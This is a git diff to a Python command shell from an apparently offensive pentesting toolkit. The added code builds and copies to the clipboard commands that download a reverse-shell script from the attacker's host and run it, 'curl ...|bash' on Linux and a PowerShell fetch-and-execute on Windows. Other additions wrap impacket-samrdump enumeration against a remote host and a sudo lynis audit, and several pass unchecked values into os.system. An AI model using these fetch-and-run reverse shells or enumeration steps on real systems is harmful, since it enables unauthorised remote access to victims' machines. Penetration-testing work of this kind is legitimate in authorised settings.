@@ -11,6 +11,7 @@ import time
 import base64
 import string
 import glob
+from urllib.parse import quote, unquote
 from modules.lazyencoder_decoder import encode, decode
 from cmd import Cmd
 
@@ -1687,6 +1688,9 @@ class LazyOwnShell(Cmd):
         """.replace("        ", "")
         print_msg(f"Try... echo '{revshell}' > sessions/revshell.sh ")
         os.system(f"echo '{revshell}' > sessions/revshell.sh ")
+        os.system(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
+        print_msg(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
+        return
 
     def do_createwinrevshell(self, line):
         """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
@@ -1714,6 +1718,9 @@ class LazyOwnShell(Cmd):
         print_msg(
             f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} "
         )
+        os.system(f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1' | xclip -sel clip")
+        print_msg(f"echo 'curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\revshell.ps1' | xclip -sel clip")
+        return
 
     def do_createhash(self, line):
         """Crea un archivo hash.txt en el directorio sessions"""
@@ -2293,14 +2300,45 @@ class LazyOwnShell(Cmd):
 
     def do_samrdump(self, line):
         """impacket-samrdump -port 445 10.10.10.10"""
-        if not self.params["rhost"]:
-            print_error("rhost must be set")
-            return
         rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
         print_msg(f"Try... impacket-samrdump -port 139  {rhost}")
         os.system(f"impacket-samrdump -port 139  {rhost}")
         print_msg(f"Try... impacket-samrdump -port 445  {rhost}")
         os.system(f"impacket-samrdump -port 445  {rhost}")
+
+        return
+
+    def do_urlencode(self, line):
+        """Encode a string for URL."""
+        if not line.strip():
+            print_error("Please provide a string to encode.")
+            return
+        
+        encoded_string = quote(line.strip())
+        print_msg(encoded_string)
+        return
+
+    def do_urldecode(self, line):
+        """Decode a URL-encoded string."""
+        if not line.strip():
+            print_error("Please provide a string to decode.")
+            return
+        
+        decoded_string = unquote(line.strip())
+        print_msg(decoded_string)
+        return
+
+    def do_lynis(self, line):
+        """sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh"""
+
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+
+        print_msg(f"Try... sudo modules/lazylynis.sh {rhost}")
+        os.system(f"sudo modules/lazylynis.sh {rhost}")
 
         return
 
